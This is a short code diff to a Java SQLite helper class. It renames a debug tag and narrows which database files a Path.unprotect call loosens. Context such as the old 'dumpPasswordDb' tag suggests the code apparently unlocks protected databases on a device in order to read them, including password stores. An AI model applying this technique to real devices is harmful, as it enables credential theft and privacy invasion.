@@ -79,7 +79,7 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 		dbFile = fs.getAbsolutePath();
 		if ( ! (Path.unprotect(dbFile, 4, false) && fs.exists() && fs.canRead()) ){
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (dumpPasswordDb) ERROR: no suitable db file");
+				Check.log(TAG + " (openCopy) ERROR: no suitable db file");
 			}
 			return null;
 		}
@@ -201,7 +201,7 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 		}
 		try {
 			Path.unprotect(name, 3, true);
-			Path.unprotect(name + "*", true);
+			Path.unprotect(name + "-journal", true);
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getReadableDatabase) open");
